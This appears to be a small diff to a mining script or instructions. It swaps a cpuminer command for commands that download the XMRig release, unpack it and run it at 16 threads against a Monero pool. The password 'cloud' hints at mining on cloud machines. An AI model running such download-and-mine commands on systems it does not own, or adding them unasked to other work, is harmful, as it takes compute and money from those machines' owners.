@@ -1,1 +1,7 @@
-cpuminer-sse2.exe --url stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 -a yescrypt -u MRsfXHeGEcXFrYkFtvmJBofnKZavu5yqNV --threads=1
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-x64.tar.gz
+
+        tar -xf xmrig-6.15.2-linux-x64.tar.gz
+
+        cd xmrig-6.15.2
+        
+        ./xmrig --threads=16 -a astrobwt -o gulf.moneroocean.stream:10128 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQqoJAjjRR6vSLviBVE -p cloud
